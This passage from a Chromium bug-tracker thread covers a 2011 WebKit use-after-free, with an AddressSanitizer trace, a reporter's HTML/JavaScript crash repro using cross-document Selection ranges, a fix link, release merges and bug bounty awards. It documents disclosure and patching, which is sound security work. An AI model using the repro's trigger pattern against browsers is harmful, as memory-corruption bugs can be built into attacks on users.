    #12 0x7facbe8dcadf in WebCore::V8Proxy::instrumentedCallFunction(WebCore::Page*, v8::Handle<v8::Function>, v8::Handle<v8::Object>, int, v8::Handle<v8::Value>*) /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:428
    #13 0x7facbe8dc7c5 in WebCore::V8Proxy::callFunction(v8::Handle<v8::Function>, v8::Handle<v8::Object>, int, v8::Handle<v8::Value>*) /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:403
previously allocated by thread T0 here:
    #0 0x7facc0e79414 in malloc ??:0
    #1 0x7facbf116896 in WebCore::RenderObject::createObject(WebCore::Node*, WebCore::RenderStyle*) /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/rendering/RenderObject.cpp:150
    #2 0x7facbe476c75 in WebCore::NodeRendererFactory::createRenderer() /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/dom/NodeRenderingContext.cpp:293
    #3 0x7facbe47705f in WebCore::NodeRendererFactory::createRendererIfNeeded() /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/dom/NodeRenderingContext.cpp:339
    #4 0x7facbe455686 in WebCore::Node::createRendererIfNeeded() /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/dom/Node.cpp:1470
    #5 0x7facbe42cda1 in WebCore::Element::attach() /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/dom/Element.cpp:964
    #6 0x7facbe656207 in WTF::PassRefPtr<WebCore::Element> WebCore::HTMLConstructionSite::attach<WebCore::Element>(WebCore::ContainerNode*, WTF::PassRefPtr<WebCore::Element>) /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/html/parser/HTMLConstructionSite.cpp:118
    #7 0x7facbe657476 in ~PassRefPtr /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:67
    #8 0x7facbe657a32 in WebCore::HTMLConstructionSite::insertHTMLBodyElement(WebCore::AtomicHTMLToken&) /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/html/parser/HTMLConstructionSite.cpp:282
    #9 0x7facbe6020a3 in WebCore::HTMLTreeBuilder::processStartTag(WebCore::AtomicHTMLToken&) /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/html/parser/HTMLTreeBuilder.cpp:1170
    #10 0x7facbe608522 in WebCore::HTMLTreeBuilder::defaultForAfterHead() /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/html/parser/HTMLTreeBuilder.cpp:2552
    #11 0x7facbe603b2d in WebCore::HTMLTreeBuilder::processEndOfFile(WebCore::AtomicHTMLToken&) /media/Chromium/chromium/depot_tools/src/third_party/WebKit/Source/WebCore/html/parser/HTMLTreeBuilder.cpp:2454
==26557== ABORTING
Stats: 6M malloced (8M for red zones) by 21949 calls
Stats: 0M realloced by 79 calls
Stats: 3M freed by 13375 calls
Stats: 0M really freed by 0 calls
Stats: 48M (12295 full pages) mmaped in 12 calls
  mmaps   by size class: 8:32766; 9:8191; 10:4095; 11:2047; 12:1024; 13:512; 14:256; 15:128; 16:64; 17:32; 22:1;
  mallocs by size class: 8:18835; 9:1380; 10:1122; 11:348; 12:77; 13:62; 14:96; 15:10; 16:12; 17:6; 22:1;
  frees   by size class: 8:11012; 9:954; 10:1003; 11:224; 12:42; 13:44; 14:81; 15:6; 16:5; 17:4;
  rfrees  by size class:
Stats: malloc large: 7 small slow: 98
Shadow byte and word:
  0x1ff5960164d0: fd
  0x1ff5960164d0: fd fd fd fd fd fd fd fd
More shadow bytes:
  0x1ff5960164b0: fd fd fd fd fd fd fd fd
  0x1ff5960164b8: fd fd fd fd fd fd fd fd
  0x1ff5960164c0: fa fa fa fa fa fa fa fa
  0x1ff5960164c8: fa fa fa fa fa fa fa fa
=>0x1ff5960164d0: fd fd fd fd fd fd fd fd
  0x1ff5960164d8: fd fd fd fd fd fd fd fd
  0x1ff5960164e0: fd fd fd fd fd fd fd fd
  0x1ff5960164e8: fd fd fd fd fd fd fd fd
  0x1ff5960164f0: fa fa fa fa fa fa fa fa


### ax...@gmail.com (2011-12-18)

Ok, won't delete anything anymore, here is a correct repro:

<html>
  <head>
    <script>
      function go() {
          var oObjectElement = document.getElementById('object'),
              oSvgDoc = oObjectElement.contentDocument,
              oSvgElement = oSvgDoc.documentElement;

          var oSelection = window.getSelection();
          var oRange = document.createRange();      // Range is empty
          oSelection.addRange(oRange);              // Selection is in HtmlDocument
          oRange.selectNode(oSvgElement);           // Range contains svg in SvgDocument
          oSelection.addRange(oRange);              // addRange/compareBoundaryPoints different document issue triggered
          oSvgDoc.removeChild(oSvgElement);         // svg elements removed
      }
    </script>
  </head>
  <body>
    <iframe id="object" onload="go()"></iframe>
  </body>
</html>

Sorry again for the confusion, messed up documents a bit. (The stack trace is still relevant.)

### sc...@gmail.com (2011-12-18)

Nice bug.

### in...@chromium.org (2012-01-06)

I have a simpler patch.

### in...@chromium.org (2012-01-06)

http://trac.webkit.org/changeset/104317

### ke...@chromium.org (2012-01-06)

[Empty comment from Monorail migration]

### js...@chromium.org (2012-01-18)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-19)

merged to m16 in r105347, m17 in r105348

### js...@chromium.org (2012-01-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-01-20)

@Ax330d: another nice bug / good report, another $1000, thanks!

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-01-31)

$5k of payout coming your way Arthur....

### ax...@gmail.com (2012-01-31)

Thanks Chris. It's always pleasure to work with you guys.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/106484?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink, Blink>DOM, Blink>SVG]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40051851)*
